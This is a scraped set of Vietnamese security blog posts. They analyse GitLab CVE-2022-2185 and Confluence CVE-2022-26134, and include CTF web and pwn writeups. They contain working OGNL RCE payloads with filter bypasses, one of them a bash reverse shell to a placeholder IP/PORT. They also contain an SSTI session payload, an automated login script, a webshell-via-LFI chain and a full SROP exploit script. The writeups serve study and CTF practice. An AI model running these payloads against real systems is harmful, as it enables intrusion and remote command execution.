[{"content":"Brief CVE description Lỗ hổng CVE-2022-2185 cho phép authenticated user có quyền import project thực hiện import một project bị chỉnh sửa có yếu tố độc hại có thể dẫn đến thực thi các command nguy hiểm trên hệ thống chạy Gitlab sử dụng các phiên bản bị ảnh hưởng.\nDanh sách các phiên bản bị ảnh hưởng:\n\u0026gt;=14.0, \u0026lt;14.10.5 \u0026gt;=15.0, \u0026lt;15.0.4 \u0026gt;=15.1, \u0026lt;15.1.1 Điểm CVSS 3.1: 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H).\nAdvisory: https://about.gitlab.com/releases/2022/06/30/critical-security-release-gitlab-15-1-1-released/#remote-command-execution-via-project-imports\nCommit: https://gitlab.com/gitlab-org/gitlab/-/commit/fae2720ffd7ec5ce3eb88e3b68b2879f4f664cf4\nMitigation Upgrade lên phiên bản mới nhất của Gitlab. Phân quyền người dùng chặt chẽ, hạn chế tối đa quyền hạn của người dùng có thể sử dụng các tính năng không cần thiết. Yêu cầu người dùng sử dụng mật khẩu mạnh. Analysis Sau khi đọc advisory và commit, ta nhận biết được rằng đây là lỗi Command Injection và đoạn code lỗi nằm ở class ImportExport::DecompressedArchiveSizeValidator.\nChúng ta có thể thấy rằng Gitlab đã thêm hàm validate_archive_path (dùng để validate @archive_path có phải là một đường dẫn trỏ đến 1 tập tin hợp lệ hay không) ngay trước khi chạy vào đoạn code thực thi command.\nBiến @archive_path được đưa trực tiếp vào giá trị của command như hình dưới đây:\nTừ đó, ta thấy được rằng chúng ta cần phải tìm cách control được @archive_path thành input của ta để có thể execute arbitrary command.\nClass DecompressedArchiveSizeValidator được sử dụng trong 2 modules là:\nBulkImports::FileDecompressionService ImportExport::FileImporter Sau quá trình review code, ta thấy rằng để control được @archive_path, ta cần phải control được project.import_source từ ImportExport::Importer. Code flow của chúng ta như sau:\nTheo như commit thì lỗi có liên quan đến phần xử lí cho bulk import nên ta sẽ tập trung vào module này nhiều hơn.\nDiff commit review Sau khi nhìn qua commit, có vài điểm đáng lưu ý sau đây:\nlib/bulk_imports/projects/transformers/project_attributes_transformer.rb spec/lib/bulk_imports/projects/transformers/project_attributes_transformer_spec.rb Tại 2 file này, chúng ta có thể thấy Gitlab fix cứng việc truyền data thông qua GraphQL, ngăn chặn việc thêm bớt key bằng cách:\nTạo 1 hash mới tên project Thêm từng attribute có dạng symbol vào project Trả về biến project thay vì trả về trực tiếp dữ liệu từ biến data =\u0026gt; Chúng ta có thể control được dữ liệu này để làm những bước tiếp theo.\nDebugging Để thuận tiện cho việc debug, chúng ta cần cho phép Gitlab truy cập vào các địa chỉ IP trong local bằng cách vào Admin Panel -\u0026gt; Settings -\u0026gt; Network, tại \u0026ldquo;Outbound requests\u0026rdquo; section, chọn vào \u0026ldquo;Allow requests to the local network from web hooks and services\u0026rdquo;.\nChúng ta hãy bắt đầu bằng việc khởi tạo 1 bulk import session.\nChọn bất kì repo nào cần import và bấm Import. Request có dạng như sau:\nPOST /import/bulk_imports.json HTTP/1.1 Host: gdk.test:3000 Cookie: [REDACTED] Content-Type: application/json Content-Length: 155 Connection: close {\u0026#34;bulk_import\u0026#34;:[{\u0026#34;source_type\u0026#34;:\u0026#34;group_entity\u0026#34;,\u0026#34;source_full_path\u0026#34;:\u0026#34;gitlab-org\u0026#34;,\u0026#34;destination_namespace\u0026#34;:\u0026#34;gitlab-org\u0026#34;,\u0026#34;destination_name\u0026#34;:\u0026#34;aaa\u0026#34;}]} Tại file app/models/bulk_imports/entity.rb, ta thấy chức năng bulk import có hỗ trợ import project bằng cách đổi source_type thành project_entity.\nVới POST data như hình trên, ta đang thực hiện import project gitlab-org/gitlab-test để tạo ra project gitlab-org/aaa.\nĐặt breakpoint tại hàm create trong app/controllers/import/bulk_imports_controller.rb. Khi request vào endpoint trên thì chương trình sẽ dừng tại breakpoint mình vừa đặt tại đây.\nBulkImports::CreateService.execute thực hiện chức năng import project bằng cách thực thi BulkImportWorker.perform_async.\nClass method perform_async gọi đến instance method perform của class BulkImportWorker.\nTrong phương thức này, có 1 dòng gọi tới class BulkImports::CreatePipelineTrackersService, class này lặp qua các pipelines được định nghĩa trong lib/bulk_imports/projects/stage.rb.\nMục đích dùng để kiểm tra xem pipeline nào phù hợp để thêm vào tracker nhằm thực hiện chức năng import.\nNhững pipeline này được thực hiện tuần tự bởi BulkImports::Pipeline::Runner. Cụ thể như hình dưới đây:\nNhiệm vụ của Runner là lặp qua từng extractor, transformer và loader của pipeline để xử lí. Dữ liệu được lấy từ extractor sẽ được truyền vào cho các transformers xử lí và dữ liệu sau khi qua transformer sẽ được đưa vào loader.\nDigging into the root cause ProjectPipeline là pipeline đầu tiên được đi vào. Lần lượt đi vào các extractor và transformer như đã khai báo:\nGraphqlExtractor được gọi với tham số query - là kết quả của Graphql::GetProjectQuery dùng để lấy dữ liệu từ GraphQL endpoint của Gitlab. ProhibitedAttributesTransformer lặp qua các attribute trong dữ liệu để bỏ đi những attribute không cho phép. ProjectAttributesTransformer cũng chính là transformer đã xuất hiện trong commit sửa lỗi của Gitlab. Nhiệm vụ chính của transformer này là để tạo một dữ liệu mới chứa những thông tin cần thiết, phục vụ cho các pipeline tiếp theo. Ở đây, biến data chính là dữ liệu được lấy từ GraphqlExtractor ở trên. Sau khi khởi tạo các attribute cần thiết cho biến data, data.transform_keys!(\u0026amp;:to_sym) sẽ tiến hành transform các keys trong biến thành kiểu Symbol. Như ta thấy, biến data đã được thêm các attributes mới như name, path, import_type, visibility_level và namespace_id. Sau khi hoàn thành xong các extractor và transformer, chúng ta sẽ được nhảy vào hàm load để tiếp tục. Projects::CreateService.execute sẽ được thực thi với tham số data ở trên.\nĐể có thể từ Projects::CreateService với import_type là gitlab_project_migration chạy đến ImportExport::Importer, ta search class này trong codebase để xem class này được dùng ở đâu.\nVậy là ImportExport::Importer được dùng với type là gitlab_project.\nTại phương thức import_schedule, @project.import_state.schedule được chạy để thực hiện tạo schedule cho import job khi thỏa mãn các điều kiện, có một điều kiện là attribute import_type không phải là gitlab_project_migration.\nĐể có thể làm được điều này, đầu phương thức execute của có sử dụng class Projects::CreateFromTemplateService để thực hiện chức năng tạo project dựa trên một built-in template được mô tả tại đây.\nĐi sâu vào class Projects::CreateFromTemplateService, chúng ta có thể thấy được phương thức thực hiện thay đổi attribute import_type tại Projects::GitlabProjectsImportService.prepare_import_params.\nSau khi hoàn thành prepare_import_params, nó sẽ tiến tục chạy Projects::CreateService một lần nữa với tham số params mới có attribute import_type là gitlab_project.\nSơ đồ của flow như sau:\nQuay trở lại lúc lần đầu tiên chạy vào Projects::CreateService, điều kiện create_from_template? được định nghĩa như sau\nKiểm tra nếu 1 trong 2 attributes là :template_name và :template_project_id có xuất hiện trong dữ liệu truyền vào Project::CreateService.\nNhư vậy tổng kết lại cả bài viết, những bước exploit của chúng ta như sau:\nTạo 1 web proxy đứng trước 1 Gitlab server. Cho Gitlab connect vào web proxy của ta. Thực hiện request import project qua tính năng Bulk import. Sửa response (đúng) trả về từ Gitlab của ta để server nhận được response (đã sửa đổi) với attribute mà ta truyền vào. RCE! Nhưng còn đó một điều đặc biệt ở lỗi này, nằm ở ImportExport::FileImporter.\nTrước khi đi vào phương thức validate_decompressed_archive_size để thực thi command, nó đi vào phương thức wait_for_archived_file trước.\nPhương thức này sẽ tiếp tục chương trình nếu @archive_file là một đường dẫn file hợp lệ và tồn tại trên hệ thống, ngược lại thì sẽ thử lại 8 lần, mỗi lần sleep 2n giây, với n là số lần đã thử.\nSau đó, phương thức này không thực hiện kết thúc mà dùng yield để thực hiện các đoạn code trong block do..end nên chúng ta vẫn thực hiện được phương thức validate_decompressed_archive_size như bình thường.\nKhi exploiting, @archive_file của ta lúc này không phải là một file hợp lệ nữa nên ta cần đợi 28 - 1 = 255 giây thì chương trình mới tiếp tục.\nResults Kết quả sau khi chờ 0xff giây:\n","permalink":"https://blog.undo.pw/posts/cve-2022-2185-gitlab-bulk-import-project/","summary":"Detail analysis of CVE-2022-2185","title":"Gitlab Remote Code Execution via Bulk Import Import Project - CVE-2022-2185"},{"content":"List of vuln references CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134 Advisory: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html Setup Khởi tạo Confluence với file docker-compose.yml có nội dung như sau:\nversion: \u0026#34;3.9\u0026#34; services: conf: image: atlassian/confluence-server:7.18.0 container_name: confluence-server depends_on: - db ports: - 8090:8090 - 8091:8091 - 5005:5005 environment: ATL_JDBC_URL: jdbc:postgresql://db:5432/confluence ATL_JDBC_USER: postgres ATL_JDBC_PASSWORD: postgres ATL_DB_TYPE: postgresql ATL_DB_DRIVER: org.postgresql.Driver ATL_DB_SCHEMA_NAME: confluence JVM_SUPPORT_RECOMMENDED_ARGS: -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 ATL_LICENSE_KEY: [REDACTED] db: image: postgres restart: always container_name: confluence-database environment: POSTGRES_PASSWORD: postgres POSTGRES_DB: confluence Thêm thắt một chút cho việc debug từ file Yaml có sẵn tại: https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/confluence-cve-2022-26134/docker-compose.yml\nHow to diff Sử dụng công cụ diff có sẵn của IntelliJ IDEA:\nidea diff [folder1] [folder2] Theo advisory, bản patch được áp dụng tại file xwork-1.0.3-atlassian-10.jar thay thế cho file cũ xwork-1.0.3-atlassian-8.jar.\nSau khi load vào công cụ diff, tiến hành chọn cả 2 files, nhấn chuột phải và chọn Compare New Files with Each Other.\nRoot cause Trong method ActionChainResult.execute() thực hiện method TextParseUtil.translateVariables() với tham số lần lượt là 2 parameters namespace và actionName.\nMethod TextParseUtil.translateVariables() được định nghĩa như sau:\n// com/opensymphony/xwork/util/TextParseUtil.class public static String translateVariables(String expression, OgnlValueStack stack) { StringBuilder sb = new StringBuilder(); Pattern p = Pattern.compile(\u0026#34;\\\\$\\\\{([^}]*)\\\\}\u0026#34;); Matcher m = p.matcher(expression); int previous; for (previous = 0; m.find(); previous = m.end()) { String g = m.group(1); int start = m.start(); String value; try { Object o = stack.findValue(g); value = o == null ? \u0026#34;\u0026#34; : o.toString(); } catch (Exception var10) { value = \u0026#34;\u0026#34;; } sb.append(expression.substring(previous, start)).append(value); } if (previous \u0026lt; expression.length()) { sb.append(expression.substring(previous)); } return sb.toString(); } Method này thực hiện việc tìm trong tham số expression giá trị nào thỏa mãn với regex \\\\$\\\\{([^}]*)\\\\} thì sẽ áp dụng phương thức OgnlValueStack.findValue() để execute OGNL.\nQuay lại với các tham số được truyền vào TextParseUtil.translateVariables(), giá trị của namespace được lấy từ ServletDispatcher.getNameSpace().\n// com/opensymphony/webwork/dispatcher/ServletDispatcher.class protected String getNameSpace(HttpServletRequest request) { String servletPath = request.getServletPath(); return getNamespaceFromServletPath(servletPath); } Method getNamespaceFromServletPath() được gọi với tham số là servletPath.\n// com/opensymphony/webwork/dispatcher/ServletDispatcher.class public static String getNamespaceFromServletPath(String servletPath) { servletPath = servletPath.substring(0, servletPath.lastIndexOf(\u0026#34;/\u0026#34;)); return servletPath; } Method này sẽ trả về giá trị của servletPath từ vị trí đầu tiên tới vị trí của kí tự / cuối cùng.\n=\u0026gt; Như vậy để OGNL expression của ta được thực hiện thì kí tự / phải được đặt vào cuối servlet path.\nBypass isSafeExpression() check Đây là cơ chế được thêm vào Confluence sau phiên bản 7.16 nhằm ngăn chặn các OGNL expression độc hại. Cốt lõi của method isSafeExpression() là sử dụng method isSafeExpressionInternal() nên ta chỉ tập trung vào phân tích hàm này.\n// com/opensymphony/xwork/util/SafeExpressionUtil.class private boolean isSafeExpressionInternal(String expression, Set\u0026lt;String\u0026gt; visitedExpressions) { if (!this.SAFE_EXPRESSIONS_CACHE.contains(expression)) { if (this.UNSAFE_EXPRESSIONS_CACHE.contains(expression)) { return false; } if (this.isUnSafeClass(expression)) { this.UNSAFE_EXPRESSIONS_CACHE.add(expression); return false; } if (SourceVersion.isName(this.trimQuotes(expression)) \u0026amp;\u0026amp; this.allowedClassNames.contains(this.trimQuotes(expression))) { this.SAFE_EXPRESSIONS_CACHE.add(expression); } else { try { Object parsedExpression = OgnlUtil.compile(expression); if (parsedExpression instanceof Node) { if (this.containsUnsafeExpression((Node)parsedExpression, visitedExpressions)) { this.UNSAFE_EXPRESSIONS_CACHE.add(expression); log.debug(String.format(\u0026#34;Unsafe clause found in [\\\u0026#34; %s \\\u0026#34;]\u0026#34;, expression)); } else { this.SAFE_EXPRESSIONS_CACHE.add(expression); } } } catch (RuntimeException | OgnlException var4) { this.SAFE_EXPRESSIONS_CACHE.add(expression); log.debug(\u0026#34;Cannot verify safety of OGNL expression\u0026#34;, var4); } } } return this.SAFE_EXPRESSIONS_CACHE.contains(expression); } Lần đầu dừng tại hàm này, OGNL expression của ta sẽ được đưa vào method OgnlUtil.compile() để parse, sau đó đưa vào method this.containsUnsafeExpression() để xử lí.\n// com/opensymphony/xwork/util/SafeExpressionUtil.class private boolean containsUnsafeExpression(Node node, Set\u0026lt;String\u0026gt; visitedExpressions) { String nodeClassName = node.getClass().getName(); if (UNSAFE_NODE_TYPES.contains(nodeClassName)) { return true; } else if (\u0026#34;ognl.ASTStaticMethod\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; !this.allowedClassNames.contains(getClassNameFromStaticMethod(node))) { return true; } else if (\u0026#34;ognl.ASTProperty\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; this.isUnSafeClass(node.toString())) { return true; } else if (\u0026#34;ognl.ASTMethod\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; this.unsafeMethodNames.contains(getMethodInOgnlExp(node))) { return true; } else if (\u0026#34;ognl.ASTVarRef\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; UNSAFE_VARIABLE_NAMES.contains(node.toString())) { return true; } else if (\u0026#34;ognl.ASTConst\u0026#34;.equals(nodeClassName) \u0026amp;\u0026amp; !this.isSafeConstantExpressionNode(node, visitedExpressions)) { return true; } else { for(int i = 0; i \u0026lt; node.jjtGetNumChildren(); ++i) { Node childNode = node.jjtGetChild(i); if (childNode != null \u0026amp;\u0026amp; this.containsUnsafeExpression(childNode, visitedExpressions)) { return true; } } return false; } } Method này hoạt động bằng cách parse OGNL expression thành các AST node rồi lặp qua từng node để kiểm tra. Những yếu tố mà thư viện XWork dựa vào để xác định expression an toàn hay không:\nNode type Class name Method name Variable name Cụ thể các node, class, method và variable được xem là unsafe:\nvà các class name được xem là safe tại property allowedClassNames:\nMethod this.isUnsafeClass() có nhiệm vụ kiểm tra class name được sử dụng trong expression có nằm trong property unsafePropertyNames hay không.\nPayload testing Đầu tiên, chúng ta xét payload đơn giản sau:\n${@java.lang.Runtime@getRuntime().exec(\u0026#34;touch /tmp/pwned\u0026#34;)} Expression hiện tại của ta có dạng ognl.ASTChain.\nSau đó lấy child node và tiếp tục parse.\nHiện tại nodeClassName có giá trị ognl.ASTStaticMethod và không nằm trong allowedClassNames nên sẽ trả về true. Đồng nghĩa với việc payload của ta đã được xem là unsafe và sẽ không thực hiện payload nữa.\nBypass ways Unicode escape Sử dụng các kí tự được unicode escaped (\\u0041 =\u0026gt; a). Kĩ thuật này được anh Jang viết tại đây.\nVề cơ bản, trong quá trình xử lí OGNL, method OgnlParserTokenManager.getNextToken() sử dụng method JavaCharStream.readChar() có hỗ trợ xử lí chuỗi unicode escape nên chúng ta có thể lợi dụng điều này để vượt qua được bộ lọc.\nNối chuỗi Ý tưởng được lấy từ blog của anh @mr_r3bot.\n${Class.forName(\u0026#34;java.lang.\u0026#34;+\u0026#34;Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;,null).invoke(null,null).exec(\u0026#34;touch /tmp/pwned\u0026#34;)}} Những thứ mà payload này sử dụng để vượt qua được các constraints:\nSử dụng trực tiếp class Class thay vì các cách như: java.lang.Class, ''.class, ''.getClass(). Tạo thành 2 chuỗi con và sử dụng nối chuỗi để ghép thành java.lang.Runtime ở giai đoạn runtime nhằm bypass method this.isUnSafeClass() trong đoạn xử lí đối với ognl.ASTConst vốn nằm ở giai đoạn pre-processing. Chúng ta có nhiều cách để đa dạng hóa payload ở bước này vì payload được thực hiện ở giai đoạn runtime. Tham khảo thêm tại đây.\nVì sử dụng kĩ thuật Reflection để truy cập vào các method trong class Runtime, cộng với việc 2 method là getMethod và invoke không bị chặn nên ta có thể call được method Runtime.exec(). Sử dụng các class có sẵn và không bị blacklist Payload này được lấy từ repo jbaines-r7/through_the_wire. Thông tin rằng đây là payload ban đầu mà nhóm APT-31 đã thực hiện tấn công khiến cho lỗ hổng 0-day của Confluence lúc này bị phát hiện và được biết đến rộng rãi như hiện tại.\n${Class.forName(\u0026#34;com.opensymphony.webwork.ServletActionContext\u0026#34;).getMethod(\u0026#34;getResponse\u0026#34;,null).invoke(null,null).setHeader(\u0026#34;\u0026#34;, Class.forName(\u0026#34;javax.script.ScriptEngineManager\u0026#34;).newInstance().getEngineByName(\u0026#34;nashorn\u0026#34;).eval(\u0026#34;new java.lang.ProcessBuilder().command(\u0026#39;bash\u0026#39;,\u0026#39;-c\u0026#39;,\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/PORT 0\u0026gt;\u0026amp;1\u0026#39;).start()\u0026#34;))} Payload này có nhiệm vụ chính là khởi tạo 1 nashorn instance (Javascript engine được tích hợp vào Java) và gọi đến ProcessBuilder.command() nhằm mục đích chạy payload để reverse shell.\nChúng ta có thể viết lại để payload này trả về kết quả tại giá trị trong header response như sau:\n${Class.forName(\u0026#34;com.opensymphony.webwork.ServletActionContext\u0026#34;).getMethod(\u0026#34;getResponse\u0026#34;,null).invoke(null,null).setHeader(\u0026#34;Result\u0026#34;,Class.forName(\u0026#34;javax.script.ScriptEngineManager\u0026#34;).newInstance().getEngineByName(\u0026#34;nashorn\u0026#34;).eval(\u0026#34;res=\u0026#39;\u0026#39;;is=java.lang.Runtime.getRuntime().exec(\u0026#39;id\u0026#39;).getInputStream();while(is.available())res+=String.fromCharCode(is.read());res\u0026#34;))} ","permalink":"https://blog.undo.pw/posts/cve-2022-26134-confluence-ognl-injection/","summary":"Brief analysis of CVE-2022-26134","title":"Atlassian Confluence Server and Data Center - OGNL Injection - CVE-2022-26134"},{"content":"TSULOTT3 Đề chỉ có 1 file main.py như sau:\nfrom flask import Flask, session, request, render_template, render_template_string from flask_session import Session from random import randint as ri app = Flask(__name__) SESSION_TYPE = \u0026#39;filesystem\u0026#39; app.config.from_object(__name__) Session(app) cheat = \u0026#34;Pls Don\u0026#39;t cheat! \u0026#34; def check_session(input): if session.get(input) == None: return \u0026#34;\u0026#34; return session.get(input) @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;,\u0026#34;POST\u0026#34;]) def index(): try: session.pop(\u0026#34;name\u0026#34;) session.pop(\u0026#34;jackpot\u0026#34;) except: pass if request.method == \u0026#34;POST\u0026#34;: ok = request.form[\u0026#39;ok\u0026#39;] session[\u0026#34;name\u0026#34;] = request.form[\u0026#39;name\u0026#39;] if ok == \u0026#34;Go\u0026#34;: session[\u0026#34;check\u0026#34;] = \u0026#34;access\u0026#34; jackpot = \u0026#34; \u0026#34;.join(str(x) for x in [ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99)]).strip() session[\u0026#34;jackpot\u0026#34;] = jackpot return render_template_string(\u0026#34;Generating jackpot...\u0026lt;script\u0026gt;setInterval(function(){ window.location=\u0026#39;/guess\u0026#39;; }, 500);\u0026lt;/script\u0026gt;\u0026#34;) return render_template(\u0026#34;start.html\u0026#34;) @app.route(\u0026#39;/guess\u0026#39;, methods=[\u0026#34;GET\u0026#34;,\u0026#34;POST\u0026#34;]) def guess(): try: if check_session(\u0026#34;check\u0026#34;) == \u0026#34;\u0026#34;: return render_template_string(cheat+check_session(\u0026#34;name\u0026#34;)) else: if request.method == \u0026#34;POST\u0026#34;: jackpot_input = request.form[\u0026#39;jackpot\u0026#39;] if jackpot_input == check_session(\u0026#34;jackpot\u0026#34;): mess = \u0026#34;Really? GG \u0026#34;+check_session(\u0026#34;name\u0026#34;)+\u0026#34;, here your flag: ASCIS{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#34; elif jackpot_input != check_session(\u0026#34;jackpot\u0026#34;): mess = \u0026#34;May the Luck be with you next time!\u0026lt;script\u0026gt;setInterval(function(){ window.location=\u0026#39;/reset_access\u0026#39;; }, 1200);\u0026lt;/script\u0026gt;\u0026#34; return render_template_string(mess) return render_template(\u0026#34;guess.html\u0026#34;) except: pass return render_template_string(cheat+check_session(\u0026#34;name\u0026#34;)) @app.route(\u0026#39;/reset_access\u0026#39;) def reset(): try: session.pop(\u0026#34;check\u0026#34;) return render_template_string(\u0026#34;Reseting...\u0026lt;script\u0026gt;setInterval(function(){ window.location=\u0026#39;/\u0026#39;; }, 500);\u0026lt;/script\u0026gt;\u0026#34;) except: pass return render_template_string(cheat+check_session(\u0026#34;name\u0026#34;)) if __name__ == \u0026#34;__main__\u0026#34;: app.secret_key = \u0026#39;xxxxxxxxxxxxxxxxxxxxx\u0026#39; app.run() Cách 1 Đây là cách mình sử dụng để solve trong lúc thi.\nPOST / name={% set x=session.update({\u0026#39;check\u0026#39;: \u0026#39;access\u0026#39;, \u0026#39;jackpot\u0026#39;: \u0026#39;\u0026#39;}) %}\u0026amp;ok= POST /guess jackpot= Cách 2 Không khai thác SSTI, sưu tầm từ các đội khác sau khi thi.\nSubmit name bất kì tại /, sau đó sẽ được redirect sang /guess. # Mô tả session session = {\u0026#39;name\u0026#39;: \u0026#39;anything\u0026#39;, \u0026#39;check\u0026#39;: \u0026#39;access\u0026#39;, \u0026#39;jackpot\u0026#39;: \u0026#39;xx xx xx xx xx xx\u0026#39;} Truy cập lại về /. # Mô tả session session = {\u0026#39;check\u0026#39;: \u0026#39;access\u0026#39;} Quay trở lại /guess và submit với 1 input rỗng (vì hàm check_session sẽ trả về chuỗi rỗng nếu key không tồn tại). among_us Viết PHP script để generate ra ticket và password mới cho user \u0026lt;?php class CrewMate { public $name = \u0026#39;tsu\u0026#39;; public $secret_number = [1, 2, 3, 4, 5, 6, 7, 8, 9]; } $arr = new CrewMate; $se = serialize($arr); echo base64_encode($se) . PHP_EOL; $de = unserialize($se); $secret_number = strtoupper($de-\u0026gt;secret_number); $random_rand = rand(0, $secret_number); srand($random_rand); $new_password = \u0026#34;\u0026#34;; while (strlen($new_password) \u0026lt; 30) { $new_password .= strval(rand()); } echo \u0026#39;New password: \u0026#39; . $new_password . PHP_EOL; ?\u0026gt; Viết Python script để tự động hóa việc lấy token để đăng nhập from re import findall from hashlib import md5 import requests REGEX_TOKEN = r\u0026#39;name=\u0026#34;token\u0026#34; value=\u0026#34;(.*?)\u0026#34;\u0026#39; PHPSESSID = \u0026#39;\u0026#39; # Nhập PHPSESSID vào biến while True: res = requests.get(\u0026#39;http://35.240.156.48/?page=forgot\u0026#39;, cookies={ \u0026#39;PHPSESSID\u0026#39;: PHPSESSID }) token = findall(REGEX_TOKEN, res.text)[0] res = requests.post(\u0026#39;http://35.240.156.48/?page=forgot\u0026#39;, data={ \u0026#39;ticket\u0026#39;: \u0026#39;Tzo4OiJDcmV3TWF0ZSI6Mjp7czo0OiJu[redacted]\u0026#39;, # Ticket được lấy từ PHP script ở trên \u0026#39;token\u0026#39;: token }, cookies={ \u0026#39;PHPSESSID\u0026#39;: PHPSESSID }) res = requests.get(\u0026#39;http://35.240.156.48/?page=login\u0026#39;, cookies={ \u0026#39;PHPSESSID\u0026#39;: PHPSESSID }) token = findall(REGEX_TOKEN, res.text)[0] res = requests.post(\u0026#39;http://35.240.156.48/?page=login\u0026#39;, data={ \u0026#39;username\u0026#39;: \u0026#39;tsu\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;117856802212731241191535857466\u0026#39;, # Password được lấy từ PHP script ở trên \u0026#39;token\u0026#39;: token }, cookies={ \u0026#39;PHPSESSID\u0026#39;: PHPSESSID }) Chạy cho đến khi script bị lỗi tại hàm findall thì dừng lại (vì login xong sẽ không còn form login nữa nên không thể lấy được token, dẫn đến lỗi).\nUpload 1 PHP webshell và server sẽ tạo 1 file zip chứa file mình mới upload lên và sẽ được xóa cho đến khi có 1 lượt upload khác. Sử dụng lỗi LFI ở trang index.php + zip wrapper (zip://) để include PHP shell trong file zip =\u0026gt; RCE. Lấy flag ở trong database. ","permalink":"https://blog.undo.pw/posts/ascis-2020-quals-web-short-writeup/","summary":"Short writeup for Web challenge that I solved in ASCIS 2020 Quals","title":"ASCIS 2020 Quals - Web short writeup"},{"content":"Foreword Theo như description của đề thì bài này là sự tổng hợp của các techniques như:\nFormat String GOT (Global Offset Table) overwrite Buffer Overflow ROP (Return-Oriented Programming) sigreturn syscall (aka SROP) Thì chúng ta chỉ việc follow theo đấy mà làm thôi.\nExploit Như chúng ta thấy thì NX và Canary đều được enabled (đại khái là không thể chạy shellcode và buffer overflow như bình thường). Nhưng bài này có Format String (đặc trưng của lỗi Format String là chúng ta có thể ghi được mọi address, miễn là có quyền write) nên chúng ta có thể bypass được Canary.\nIdea Idea của mình trong bài này như sau:\nOverwrite __stack_chk_fail GOT address để tránh exit program khi đè qua canary Ghi chuỗi format của hàm scanf lên section có quyền write (ở đây là .bss section) Làm cho register rax = 0xf khi chạy qua hàm scanf để gọi sys_rt_sigreturn syscall Craft 1 stack frame bằng pwntools để chạy sys_execve syscall Exploit Analyse from pwn import * binary = ELF(\u0026#39;./beginners_pwn\u0026#39;, checksec=False) p = remote(\u0026#39;35.221.81.216\u0026#39;, 30002) got_table = binary.symbols[\u0026#39;_GLOBAL_OFFSET_TABLE_\u0026#39;] start_main_ret = 0x401203 end_main_ret = 0x401256 pop_rdi_ret = 0x4012c3 pop_rsi_r15_ret = 0x4012c1 syscall = 0x40118f p.sendline((\u0026#39;%7$s%s\u0026#39;).ljust(8, \u0026#39;\\x00\u0026#39;) + p64(binary.symbols[\u0026#39;got.__stack_chk_fail\u0026#39;])) p.sendline(p64(end_main_ret)[:-1]) # đoạn này slice đi 1 byte cao để không bị đè với hàm ngay bên dưới __stack_chk_fail là scanf p.sendline(\u0026#39;A\u0026#39;*24 + p64(end_main_ret) + p64(start_main_ret)) # đoạn này phải 16 bytes stack-aligned p.sendline((\u0026#39;%7$s%s\u0026#39;).ljust(8, \u0026#39;\\x00\u0026#39;) + p64(got_table+0x30)) p.sendline(\u0026#39;%1$s\u0026#39;*0xf) # ghi \u0026#39;%1$s\u0026#39; 15 lần vào .bss payload = p64(pop_rdi_ret) payload += p64(got_table+0x30) payload += p64(pop_rsi_r15_ret) payload += p64(got_table+0x80) payload += p64(0) payload += p64(binary.symbols[\u0026#39;plt.__isoc99_scanf\u0026#39;]) # scanf(format=got_table+0x30, varargs=got_table+0x80) # sau khi nhập 15 lần \u0026#39;/bin/sh\u0026#39; (line 45) vào scanf thì lúc đó rax=0xf và nhảy vào syscall luôn # \u0026#39;/bin/sh\u0026#39; sẽ luôn được ghi vào cùng 1 địa chỉ là argument đầu tiên (ở đây chính là got_table+0x80) payload += p64(syscall) # Setup stack frame cho Sigreturn frame = SigreturnFrame(arch=\u0026#39;amd64\u0026#39;) frame.rax = 0x3b # sys_execve frame.rdi = got_table+0x80 # \u0026#39;/bin/sh\\x00\u0026#39; frame.rsi = 0 # reset rsi frame.rdx = 0 # reset rdx frame.rip = syscall # jump tới syscall address để gọi sys_execve payload += str(frame) p.sendline(\u0026#39;A\u0026#39;*24 + payload) p.sendlines([\u0026#39;/bin/sh\\x00\u0026#39;]*0xf) # Gửi \u0026#39;/bin/sh\\x00\u0026#39; 15 lần p.interactive() ","permalink":"https://blog.undo.pw/posts/tsgctf-2020-beginners-pwn/","summary":"Writeup for an easy Pwn challenge that I solved in TSGCTF 2020","title":"TSGCTF 2020 - Beginner's Pwn"},{"content":"WYSINWYG What you see is not what you get... Do you see the flag? then you don\u0026#39;t get the flag. Tác giả cho ta một đoạn code PHP ngắn:\n\u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); include(\u0026#39;secret.php\u0026#39;); show_source(__FILE__); if (isset($_GET[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;b\u0026#39;])) { $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if (!empty($a) \u0026amp;\u0026amp; !empty($b)) { if ($a === $b) { if (isset($_GET[\u0026#39;a⁡\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;b⁦\u0026#39;])) { $a = $_GET[\u0026#39;a⁡\u0026#39;]; $b = $_GET[\u0026#39;b⁦\u0026#39;]; if ($a !== $b) { die($flag); } } } } } Bài này tác giả chèn 2 kí tự zero-width space vào sau a và b ở dòng 11, 12 và 13.\nPoC:\n/?a=1\u0026amp;b=1\u0026amp;a%E2%81%A1=1\u0026amp;b%E2%81%A6=0 Secure System I created a security checker, can you help audit the source? Source: https://drive.google.com/file/d/1vOPmS30ZrW5-Uoz-AKBef3T6no2qpvt_/view Source code chỉ có 1 file index.php như sau:\n\u0026lt;?php require_once(\u0026#39;dbconnect.php\u0026#39;); $flag = mysqli_query($conn, \u0026#34;SELECT * FROM xxxxxxxxxxxxxxxxxxx\u0026#34;)-\u0026gt;fetch_assoc()[\u0026#39;yyyyyyyyyyyyyyyyyyyy\u0026#39;]; //Sorry It\u0026#39;s our secret, can\u0026#39;t share ?\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;center\u0026gt; Security Check!!! Please enter your ID to prove who are you !!!: 